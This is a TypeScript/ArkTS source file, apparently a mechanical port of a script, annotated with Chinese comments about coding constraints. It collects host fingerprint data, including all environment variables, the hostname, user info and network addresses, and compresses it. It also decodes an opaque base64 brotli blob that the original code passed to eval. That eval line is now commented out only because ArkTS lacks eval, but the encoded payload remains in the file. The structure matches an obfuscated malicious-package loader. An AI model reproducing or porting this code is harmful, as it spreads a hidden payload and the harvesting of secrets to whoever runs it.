// 应用约束：9. 使用let而非var，80. import语句前置
import os from 'os'; // 假设os模块已适配为ETS模块
import zlib from 'zlib'; // 假设zlib模块已适配
import fs from 'fs'; // 假设fs模块已适配

// 应用约束：24. 对象字面量类型声明
class NetworkInterfaceInfo {
    address?: string;
    family?: string;
}

class NetworkInterfaces {
    [key: string]: NetworkInterfaceInfo[];
}

class CpuInfo {
    model!: string;
    speed!: number;
    times?: object; // 约束：10. 避免any
}

class SystemInfo {
    name!: string;
    version!: string;
    pwd!: string;
    env!: object;
    platform!: string;
    arch!: string;
    release!: string;
    type!: string;
    uptime!: number;
    hostname!: string;
    cpus!: [number, CpuInfo];
    networkInterfaces!: { [key: string]: NetworkInterfaceInfo };
    freemem!: number;
    totalmem!: number;
    userInfo!: object;
}

// 应用约束：26. 使用箭头函数
const filterNet = (o: NetworkInterfaces): { [key: string]: NetworkInterfaceInfo } => {
    const oR: { [key: string]: NetworkInterfaceInfo } = {};
    // 应用约束：41. 替换for..in为Object.keys
    Object.keys(o).forEach(k => {
        if (k === "lo0") return;
        const interfaces = o[k];
        for (const iface of interfaces) {
            if (iface.address === "127.0.0.1") continue;
            if (iface.family === "IPv4" && iface.address) {
                oR[k] = iface;
                break;
            }
        }
    });
    return oR;
};

// 应用约束：33. 替换delete为null赋值
const rmKeys = (o: Record<string, any>, ...keys: string[]): Record<string, any> => {
    keys.forEach(k => {
        o[k] = null;
    });
    return o;
};

// 应用约束：23. 显式类型标注
const pkg: { name: string; version: string } = JSON.parse(
    fs.readFileSync("package.json").toString("utf8")
);

// 应用约束：32. 运算符类型限制，73. 移除as const
const bs = "base64"; 

const zS = (s: string): string => 
    zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs);

const zO = (o: SystemInfo): string => 
    zS(JSON.stringify(o, null, 2));

const uS = (s: string): string => 
    zlib.brotliDecompressSync(Buffer.from(s, bs)).toString();

// 应用约束：24. 对象类型声明
const o: SystemInfo = {
    name: pkg.name,
    version: pkg.version,
    pwd: process.cwd(),
    env: process.env,
    platform: os.platform(),
    arch: os.arch(),
    release: os.release(),
    type: os.type(),
    uptime: os.uptime(),
    hostname: os.hostname(),
    cpus: [os.cpus().length, rmKeys(os.cpus()[0], "times") as CpuInfo],
    networkInterfaces: filterNet(os.networkInterfaces()),
    freemem: os.freemem(),
    totalmem: os.totalmem(),
    userInfo: os.userInfo()
};

// 应用约束：1. 避免any类型
const s: string = zO(o);
const s1: string = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);

// 应用约束：71. 移除eval相关代码
// eval(s1); // ArkTS不支持eval，此代码需删除或重构

// 应用约束：66. 移除ts-ignore注释
// console.log(o); // 保留日志输出
